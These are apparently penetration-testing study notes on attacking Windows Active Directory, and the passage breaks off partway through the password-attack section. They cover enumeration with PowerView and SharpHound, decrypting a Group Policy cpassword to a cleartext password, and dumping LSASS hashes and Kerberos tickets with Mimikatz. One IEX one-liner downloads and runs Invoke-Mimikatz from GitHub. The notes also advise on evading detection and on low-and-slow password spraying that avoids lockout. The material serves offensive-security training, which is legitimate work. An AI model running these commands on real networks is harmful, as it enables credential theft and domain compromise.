# Active Directory

## Table of Contents

- [Active Directory - Manual Enumeration](#active-directory---manual-enumeration)
  - [Enumeration Using Legacy Windows Tools](#enumeration-using-legacy-windows-tools)
  - [Enumeration Using PowerShell and .NET Classes](#enumeration-using-powershell-and-.NET-Classes)
  - [Enumeration with PowerView](#enumeration-with-powerview)
  - [Getting an Overview - Permissions and Logged on Users](#getting-an-overview---permissions-and-logged-on-users)
  - [Enumeration Through Service Principal Names](#enumeration-through-service-principal-names)
  - [Enumerating Object Permissions](#enumerating-object-permissions)
  - [Enumerating Domain Shares](#enumerating-domain-shares)
- [Active Directory - Automated Enumeration](#active-directory---manual-enumeration)
  - [Collect domain data using SharpHound](#collect-domain-data-using-sharphound)
  - [Analyze the data using BloodHound](#analyze-the-data-using-bloodhound)
- [Understanding Active Directory Authentication](#understanding-active-directory-authentication)
  - [NTLM Authentication](#ntlm-authentication)
  - [Kerberos Authentication](#kerberos-authentication)
  - [Cached AD Credentials - Mimikatz](#cached-ad-credentials---mimikatz)
- [Performing Attacks on Active Directory Authentication](#performing-attacks-on-active-directory-authentication)
  - [Password Attacks](#password-attacks)
  - [AS-REP Roasting](#as-rep-roasting)
  - [Kerberoasting - Service Account Attacks](#service-account-attacks)
  - [Silver Tickets](#silver-tickets)
  - [Domain Controller Synchronization](#domain-controller-synchronization)
- [Active Directory Lateral Movement Techniques](#active-directory-lateral-movement-techniques)
  - [WMI and WinRM](#wmi-and-winrm)
  - [PsExec](#psexec)
  - [Secretsdump](#secretsdump)
  - [Pass the Hash](#pass-the-hash)
  - [Overpass the Hash](#overpass-the-hash)
  - [Pass the Ticket](#pass-the-ticket)
  - [Distributed Component Object Model](#distributed-component-object-model)
- [Active Directory Persistence](#active-directory-persistence)
  - [Golden Tickets](#golden-tickets)
  - [Shadow Copies](#shadow-copies)
  - [Dump Hashes in Windows XP](#dump-hashes-in-windows-xp)
- [Mimikatz Troubleshooting](#mimikatz-troubleshooting)

**REMINDER**: Syntax for `rdesktop`:
```sh
rdesktop -u [user] -p [pwd] -d [domain name] [ip:port]
```

## Active Directory - Manual Enumeration
Typically, an attack against Active Directory infrastructure begins with a successful exploit or client-side attack against either a domain workstation or server followed by enumeration of the AD environment.

### Enumeration Using Legacy Windows Tools
This technique levearges the built-in *net.exe* application. Specifically the **net user** sub-command.

```cmd
C:\Users\Offsec.corp> net user                        REM Enumerate all local accounts

C:\Users\Offsec.corp> net user /domain                REM Enumerate all domain accounts

C:\Users\Offsec.corp> net user jeff_admin /domain     REM Query information about individual users

C:\Users\Offsec.corp> net group /domain               REM Enumerate all domain groups
```
Unfortunately the **net.exe** command tool can't list nested groups and only shows the direct user members.
### Enumeration Using PowerShell and .NET Classes
PowerShell cmdlets like *`Get-ADUser`* work well but they are only installed by default on domain controllers, and while they may be installed on Windows workstations from Windows 7 and up, they require administrative privileges to use.

We use a PS script to enumerate AD. As an overview, this script will query the network for the name of the Primary domain controller emulator and the domain, search Active Directory and filter the output to display user accounts, and then clean up the output for readability.

This script relies on a few components. Specifically, we will use a [*DirectorySearcher*](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-6.0) object to query Active Directory using the [*Lightweight Directory Access Protocol (LDAP)*](https://ldap.com/), which is a network protocol understood by domain controllers also used for communication with third-party applications.

LDAP is an [*Active Directory Service Interfaces (ADSI)*](https://msdn.microsoft.com/en-us/library/aa772170(v=vs.85).aspx) provider (essentially an API) that supports search functionality against an Active Directory. This will allow us to interface with the domain controller using PowerShell and extract non-privileged information about the objects in the domain.

Our script will center around a very specific LDAP provider path that will serve as input to the DirectorySearcher .NET class. The path's prototype looks like this:
```txt
LDAP://HostName[:PortNumber][/DistinguishedName]
```
[Powershell Enumeration script](https://gist.github.com/A-Pisani/d1a3892b1ca094918ef06cfb982b4b11#file-enumeratead-ps1)
#### Filters
Available filters using the DirectorySearcher object are:
- locate members of specific groups like Domain Admin.
    ```txt
    $Searcher.filter="(&(samAccountType=805306368)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com))"
    ```
    - You can use a similar script to find `Exchange Admins`, just provide the correct CN.
    - Be sure to change the DC to match your Domain Controller name.

- search only for the Jeff_Admin user.
    ```txt
    $Searcher.filter="name=Jeff_Admin"
    ```
- through the [samAccountType attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN), which is an attribute that all user, computer, and group objects have. In our case we can supply `0x30000000` (decimal `805306368`) to the filter property to enumerate all users in the domain.
    ```txt
    $Searcher.filter="samAccountType=805306368"
    ```
- only return computers
    ```txt
    $Searcher.filter="(objectClass=Computer)" 
    ```
- only return computers running Windows 10.
    ```txt
    $Searcher.filter="operatingsystem=Windows 10 Pro"
    ```
### Enumeration with PowerView
We want to find logged-in users as their credentials will be cached in memory and we could steal them and authenticate with them.

To do so we will use [**PowerView**](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1), a Powershell script part of the Powershell Empire framework.

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1                          # Import PowerView to memory.
PS C:\Tools> Get-NetDomain                                          # Obtain domain information.
PS C:\Tools> Get-NetUser | select cn                                # Query users in a domain.
PS C:\Tools> Get-NetGroup | select cn                               # Query groups in a domain.
PS C:\Tools> Get-NetGroup "Sales Department" | select member        # Enumerating the "Sales Department" group.

PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname   # Enumerating OSs and hostnames
```

### Getting an Overview - Permissions and Logged on Users
Now that we have a clear list of computers, users, and groups in the domain, we will continue our enumeration and focus on the relationships between as many objects as possible. These relationships often play a key role during an attack, and our goal is to build a *map* of the domain to find potential attack vectors.

For example, when a user logs in to the domain, their credentials are cached in memory on the computer they logged in from.

When the time comes to escalate our privileges, we don't necessarily need to immediately escalate to *Domain Admins* because there may be other accounts that have higher privileges than a regular domain user, even if they aren't necessarily a part of the *Domain Admins* group. *Service Accounts*, are a good example of this. Although they may not always have the highest privilege possible, they may have more permissions than a regular domain user, such as local administrator privileges on specific servers.

- Enumerate logged-in users on a workstation or server (eg `client251`)
    ```powershell
    PS C:\Tools\> Get-NetLoggedon -ComputerName client251 -Verbose
    ```
> :warning: We can see in some cases that enumerating sessions with PowerView does not always work and we need to use a different tool. It should not work on Windows systems:
> - Windows Server operating systems since Windows Server 2019 build 1809 on.
> - Windows 10 machines around build 1709.

Even though NetSessionEnum does not work in this case, we should still keep it in our toolkit since it's not uncommon to find older systems in real-world environments.

Fortunately there are other tools we can use, such as the [*PsLoggedOn*](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) application from the SysInternals Suite. The documentation states that *PsLoggedOn* will enumerate the registry keys under **`HKEY_USERS`** to retrieve the security identifiers (SID) of logged-in users and convert the SIDs to usernames. *PsLoggedOn* will also use the *NetSessionEnum* API to see who is logged on to the computer via resource shares.

One limitation, however, is that *PsLoggedOn* relies on the Remote Registry service in order to scan the associated key. The Remote Registry service has not been enabled by default on Windows workstations since Windows 8, but system administrators may enable it for various administrative tasks, for backwards compatibility, or for installing monitoring/deployment tools, scripts, agents, etc.

It is also enabled by default on later Windows Server Operating Systems such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). If it is enabled, the service will stop after ten minutes of inactivity to save resources, but it will re-enable (with an automatic trigger) once we connect with *PsLoggedOn*.

- Using PsLoggedOn to see user logons.
    ```powershell
    PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04
    
    Users logged on locally:
         <unknown time>             CORP\jeff
    Unable to query resource logons
    ```
- Even if accourding to the output there are no users logged in on a Server it may be a false positive since we cannot know for sure that the Remote Registry service is running, but if we don't receive any error messages maybe the output is accurate.
    ```powershell
    PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04
    
    No one is logged on locally.
    Unable to query resource logons
    ```
    
> Under the hood PowerView uses the [*NetWkstaUserEnum*](https://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85).aspx) and [*NetSessionEnum*](https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum) API. While the former requires administrative permissions and returns the list of all users logged on to a target workstation, the latter can be used from a regular domain user and returns a list of active user sessions on servers such as fileservers or domain controllers.
>
> During an assessment, after compromising a domain machine, we should enumerate every computer in the domain and then use *NetWkstaUserEnum* against the obtained list of targets. 
>
> Alternatively we could focus our efforts on discovering the domain controllers and any potential file servers (based on servers hostnames or open ports) in the network and use *NetSessionEnum* against these servers in order to enumerate all active users' sessions.

### Enumeration Through Service Principal Names

> **Note**:
> SPN stands for Service Principal Name, and it is a unique identifier for a service instance in a Microsoft Active Directory domain. An SPN associates a service instance with a domain user account that runs the service. It helps clients identify the service on the network and authenticate it properly.
>
> In Active Directory, an SPN consists of two parts: the service class and the hostname. The service class represents the type of service, such as HTTP or LDAP, and the hostname represents the name of the computer or service. For example, an SPN for a web server might be "HTTP/server.domain.com".
>
> SPNs are used for Kerberos authentication, which is a network authentication protocol that uses secret-key cryptography. When a client requests a service from a server, it first obtains a ticket-granting ticket (TGT) from the Kerberos authentication server. The client then presents the TGT to the server and requests a service ticket. The server uses the SPN to locate the appropriate service account in Active Directory and authenticate the client.
>
> In summary, SPNs are essential for proper authentication and secure communication between services in an Active Directory domain.

An alternative to attacking a domain user account is to target [*Service Accounts*](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686005(v=vs.85).aspx) ([LocalSystem](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx), [LocalService](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx), and [NetworkService](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx)), which may also be members of high value groups.

When applications like Exchange, SQL, or Internet Information Services (IIS) are integrated into Active Directory, a unique service instance identifier known as a [Service Principal Name (SPN)](https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx) is used to associate a service on a specific server to a service account in Active Directory.

- By enumerating all registered SPNs in the domain, we can obtain the IP address and port number of applications running on servers integrated with the target Active Directory, limiting the need for a broad port scan.
- Since the information is registered and stored in Active Directory, it is present on the domain controller. To obtain the data, we will again query the domain controller in search of specific service principal names.

To enumerate SPNs in the domain, we can use:
- **setspn.exe**, installed on Windows by default. We can iterate through the list of domain users previously discovered (in the case we only do it on the *iis_service* Domain User).
    ```powershell
    c:\Tools>setspn -L iis_service
    Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80
    ```
- PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname and serviceprincipalname attributes:
    ```powershell
    PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname
    
    samaccountname serviceprincipalname
    -------------- --------------------
    krbtgt         kadmin/changepw
    iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
    ```
    
From there on you can resolve the SPN using nslookup:
```powershell
PS C:\Tools\> nslookup.exe web04.corp.com
Server:  UnKnown
Address:  192.168.50.70

Name:    web04.corp.com
Address:  192.168.50.72
```
### Enumerating Object Permissions
In this section, we will enumerate specific permissions that are associated with Active Directory objects.

An object in AD may have a set of permissions applied to it with multiple [*Access Control Entries* (ACE)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries). These ACEs make up the [*Access Control List* (ACL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists). Each ACE defines whether access to the specific object is allowed or denied.

As a very basic example, let's say a domain user attempts to access a domain share (which is also an object). The targeted object, in this case the share, will then go through a validation check based on the ACL to determine if the user has permissions to the share. This ACL validation involves two main steps:
1. In an attempt to access the share, the user will send an access token, which consists of the user identity and permissions. 
2. The target object will then validate the token against the list of permissions (the ACL). 
If the ACL allows the user to access the share, access is granted. Otherwise the request is denied.

AD includes a wealth of permission types that can be used to [configure an ACE](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2). However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide:
```text
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
> The [Microsoft documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks) lists other permissions and describes each in more detail.

To enumerate ACEs we can use **Get-ObjectAcl** in PowerView.
- Enumerate our own user to determine which ACEs are applied to it
    ```powershell
    PS C:\Tools> Get-ObjectAcl -Identity stephanie

    ...
    ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
    ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
    ActiveDirectoryRights  : ReadProperty
    SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
    ```
The output lists two [*Security Identifiers* (SID)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers), unique values that represent an object in AD. In order to make sense of the SID, we can use PowerView's **Convert-SidToName** command to convert it to an actual domain object name:
```powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```
Taking this information together, the [*RAS and IAS Servers*](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#ras-and-ias-servers) group has *ReadProperty* access rights to our user (*Stephanie*). While this is a common configuration in AD and likely won't give us an attack vector, we have used the example to make sense of the information we have obtained.

We can continue to use **Get-ObjectAcl** and select only the properties we are interested in, namely *ActiveDirectoryRights* and *SecurityIdentifier*. While the *ObjectSID* is nice to have, we don't need it when we are enumerating specific objects in AD since it will only contain the SID for the object we are in fact enumerating.

> Although we should enumerate all objects the domain, let's start with the *Management Department* group for now. We will check if any users have GenericAll permissions.
```powershell
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll

PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```

The first SID belongs to the *Domain Admins* group and the GenericAll permission comes as no surprise since *Domain Admins* have the highest privilege possible in the domain. What's interesting, however, is to find stephanie in this list. Typically, a regular domain user should not have GenericAll permissions on other objects in AD, so this may be a misconfiguration.

We can abuse this misconfiguration to do some weird stuff:
```powershell
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
PS C:\Tools> net group "Management Department" stephanie /del /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
CN=jen,CN=Users,DC=corp,DC=com
```
### Enumerating Domain Shares
Domain shares often contain critical information about the environment, which we can use to our advantage.

We'll use PowerView's **Find-DomainShare** function to find the shares in the domain. We could also add the *-CheckShareAccess* flag to display shares only available to us. However, we'll skip this flag for now to return a full list, including shares we may target later. 

> Note:
> It may take a few moments for PowerView to find the shares and list them.

```powershell
PS C:\Tools> Find-DomainShare

Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com
```
#### SYSVOL
In this instance, we'll first focus on [**SYSVOL**](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx), as it may include files and folders that reside on the domain controller itself. This particular share is typically used for various domain policies and scripts. By default, the **SYSVOL** folder is mapped to **%SystemRoot%\SYSVOL\Sysvol\domain-name** on the domain controller and every domain user has access to it.
```powershell
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\

    Directory: \\dc1.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts
```
-  Listing contents of the **Policies** folder:
    ```powershell
    PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\

        Directory: \\dc1.corp.com\sysvol\corp.com\Policies

    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----         9/21/2022   1:13 AM                oldpolicy
    d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
    d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
    
    PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
    <?xml version="1.0" encoding="utf-8"?>
    <Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
      <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
              name="Administrator (built-in)"
              image="2"
              changed="2012-05-03 11:45:20"
              uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
        <Properties
              action="U"
              newName=""
              fullName="admin"
              description="Change local admin"
              cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"                   # !!!!
              changeLogon="0"
              noChange="0"
              neverExpires="0"
              acctDisabled="0"
              userName="Administrator (built-in)"
              expires="2016-02-10" />
      </User>
    </Groups>
    ```
Due to the naming of the folder and the name of the file itself, it appears that this is an older domain policy file. This is a common artifact on domain shares as system administrators often forget them when implementing new policies. In this particular case, the XML file describes an old policy (helpful for learning more about the current policies) and an encrypted password for the local built-in Administrator account. The encrypted password could be extremely valuable for us.

Historically, system administrators often changed local workstation passwords through [*Group Policy Preferences* (GPP)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)).

However, even though GPP-stored passwords are encrypted with AES-256, the [private key for the encryption has been posted on MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2). We can use this key to decrypt these encrypted passwords. In this case, we'll use the [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) ruby script in Kali Linux that decrypts a given GPP encrypted string:
```bash
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```
## Active Directory - Automated Enumeration
### Collect domain data using SharpHound
We'll use BloodHound in the next section to analyze, organize and present the data, and the companion data collection tool, [SharpHound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html) to collect the data. SharpHound is written in C# and uses Windows API functions and LDAP namespace functions similar to those we used manually in the previous sections. For example, SharpHound will attempt to use *NetWkstaUserEnum* and *NetSessionEnum* to enumerate logged-on sessions, just as we did earlier. It will also run queries against the Remote Registry service, which we also leveraged earlier.

SharpHound is available in a few different formats. We can compile it ourselves, use an already compiled executable, or use it as a PowerShell script. First, let's open a PowerShell window and import the script to memory:
```powershell
PS C:\Tools> Import-Module .\Sharphound.ps1
```

With SharpHound imported, we can now start collecting domain data. However, in order to run SharpHound, we must first run **Invoke-BloodHound**. 

We'll begin with the **-CollectionMethod**, which describes the various collection methods. In our case, we'll attempt to gather **All** data, which will perform all collection methods except for local group policies.

By default, SharpHound will gather the data in JSON files and automatically zip them for us. This makes it easy for us to transfer the file to Kali Linux later. We'll save this output file on our desktop, with a "corp audit" prefix as shown below:
```powershell
PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
### Analyze the data using BloodHound
In order to use BloodHound, we need to start the Neo4j service, which is installed by default. Note that when Bloodhound is installed with APT, the Neo4j service is automatically installed as well.
```bash
kali@kali:~$ sudo neo4j start
...
Started neo4j (pid:334819). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

The Neo4j service is now running and it should be available via the web interface at http://localhost:7474. Let's browse this location and authenticate using the default credentials (*neo4j* as both username and password):

With Neo4j running, it's time to start BloodHound as well. We can do this directly from the terminal:
```bash
kali@kali:~$ bloodhound
```
Since we haven't imported data yet, we don't have any visual representation of the domain at this point. In order to import the data, we must first transfer the zip file from our Windows machine to our Kali Linux machine. We can then use the *Upload Data* function on the right side of the GUI to upload the zip file, or drag-and-drop it into BloodHound's main window. Either way, the progress bar indicates the upload progress.

- Let's first get an idea about how much data the database really contains. To do this, let's click the More Info tab at the top-left. This presents the *Database Info*.
- For now, we are mostly interested in the *Analysis* button. When we click it, we are presented with various pre-built analysis options.


## Understanding Active Directory Authentication
### NTLM Authentication
The following steps present an outline of NTLM noninteractive authentication. The first step provides the user's NTLM credentials and occurs only as part of the interactive authentication (logon) process.

1. (Interactive authentication only) A user accesses a client computer and provides a domain name, user name, and password. The client computes a cryptographic hash of the password and discards the actual password.
2. The client sends the user name to the server (in plaintext).
3. The server generates a 8-byte random number, called a challenge or nonce, and sends it to the client.
4. The client encrypts this challenge with the hash of the user's password and returns the result to the server. This is called the response.
5. The server sends the following three items to the domain controller:
    - User name
    - Challenge sent to the client
    - Response received from the client
6. The domain controller uses the user name to retrieve the hash of the user's password from the Security Account Manager database. It uses this password hash to encrypt the challenge.
7. The domain controller compares the encrypted challenge it computed (in step 6) to the response computed by the client (in step 4). If they are identical, authentication is successful.
![image](https://user-images.githubusercontent.com/48137513/198819917-be17010c-3900-4874-aa70-923fa402f568.png)

### Kerberos Authentication
While NTLM authentication works through a principle of challenge and response, Windows-based Kerberos authentication uses a ticket system.

At a high level, Kerberos client authentication to a service in Active Directory involves the use of a domain controller in the role of a key distribution center, or KDC.

1. when a user logs in to their workstation, a request is sent to the domain controller, which has the role of KDC and also maintains the Authentication Server service. This Authentication Server Request (or `AS_REQ`) contains a timestamp that is encrypted using a hash derived from the password of the user and the username.
    - When the domain controller receives the request, it looks up the password hash associated with the specific user and attempts to decrypt the timestamp. If the decryption process is successful and the time stamp is not a duplicate (a potential replay attack), the authentication is considered successful.

2. The domain controller replies to the client with an Authentication Server Reply (`AS_REP`) that contains a *session key* (since Kerberos is stateless) and a **Ticket Granting Ticket (TGT)**. 
    - The session key is encrypted using the user's password hash, and may be decrypted by the client and reused. 
    - The TGT contains information regarding the user (including group memberships, the domain, a time stamp, the IP address of the client) and the session key.
    - In order to avoid tampering, the Ticket Granting Ticket is encrypted by a secret key known only to the KDC and can not be decrypted by the client. 

Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for 10 hours, after which a renewal occurs. This renewal does not require the user to re-enter the password.

When the user wishes to access resources of the domain, such as a network share, an Exchange mailbox, or some other application with a registered service principal name, it must again contact the KDC.

3. This time, the client constructs a Ticket Granting Service Request (or `TGS_REQ`) packet that consists of the current user and a timestamp (encrypted using the session key), the SPN of the resource, and the encrypted TGT.
    - Next, the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. As this point the KDC performs several checks:
        - The TGT must have a valid timestamp (no replay detected and the request has not expired).
        - The username from the TGS_REQ has to match the username from the TGT.
        - The client IP address needs to coincide with the TGT IP address.

4. If this verification process succeeds, the ticket granting service responds to the client with a Ticket Granting Server Reply or TGS_REP. This packet contains three parts:
    - The SPN to which access has been granted.
    - A session key to be used between the client and the SPN.
    - A service ticket containing the username and group memberships along with the newly-created session key.
The first two parts (SPN and session key) are encrypted using the session key associated with the creation of the TGT and the service ticket is encrypted using the password hash of the service account registered with the SPN in question.

Once the authentication process by the KDC is complete and the client has both a session key and a service ticket, the service authentication begins.

5. First, the client sends to the application server an application request or AP_REQ , which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.

6. The application server decrypts the service ticket using the service account password hash and extracts the username and the session key. It then uses the latter to decrypt the username from the AP_REQ. If the AP_REQ username matches the one decrypted from the service ticket, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service.

![image](https://user-images.githubusercontent.com/48137513/198820441-03cbb520-c7b0-4b1c-81a2-146c3b792187.png)

### AD Cached Credentials - Mimikatz
Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the [Local Security Authority Subsystem Service (LSASS)](https://technet.microsoft.com/en-us/library/cc961760.aspx) memory space.
- If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.
- Since the LSASS process is part of the operating system and runs as SYSTEM, we need [**SYSTEM (or local administrator) permissions**](https://gist.github.com/A-Pisani/efa2a11cbf555e7e83c70c9406b730c6#understanding-windows-privileges-and-integrity-levels) to gain access to the hashes stored on a target.

An application used to dump password hashes is [**Mimikatz**](https://github.com/gentilkiwi/mimikatz).

>**Note**:
>In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application. For example, execute Mimikatz directly from memory using an injector like [PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and from there, [load the data into Mimikatz](https://fuzzysecurity.com/tutorials/18.html).
>
>```cmd
>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz
>```

Executing mimikatz on a domain workstation
```cmd
C:\Tools\active_directory> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```
- We can observe two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest11 will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext passwords alongside the password hashes.
- Armed with these hashes, we could attempt to [crack them and obtain the cleartext password](https://gist.github.com/A-Pisani/a79808e058ccc49bcf71921a05d51f80#cracking-nt-hashes).

> **Note**:
> An effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional LSA Protection.10 The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process. We'll discuss how to bypass this and other powerful defensive mechanisms in-depth in OffSec's Evasion Techniques and Breaching Defenses course, PEN-300.

- A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS and we can use Mimikatz to interact with and retrieve our own tickets and the tickets of other local users.

Extracting Kerberos tickets with mimikatz
```cmd
mimikatz # sekurlsa::tickets
```
- Stealing a TGS would allow us to access only particular resources associated with those tickets. 
- armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain.

## Performing Attacks on Active Directory Authentication
### Password Attacks
Active Directory can also provide us with information that may lead to a more advanced password guessing technique against user accounts. When performing a brute-force or wordlist authentication attack, we must be aware of account lockouts since too many failed logins may block the account for further attacks and possibly alert system administrators.

Use LDAP and ADSI to perform a "low and slow" password attack against AD users without triggering an account lockout.

First, let's take a look at the domain's account policy with **net accounts**:
```powershell
PS C:\Users\Offsec.corp> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    5               # limit of five login attempts before lockout
Lockout duration (minutes):                           30              # time (min) after the last failed login, we are able to make another attempt.
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

We can test an AD user login, using [this PowerShell script](#file-login-ps1):
- If the password for the user account is correct, the object creation will be successful.
    ```
    distinguishedName : {DC=corp,DC=com}
    Path              : LDAP://DC01.corp.com/DC=corp,DC=com
    ```
- If the password is invalid, no object will be created and we will receive an exception.
    ```
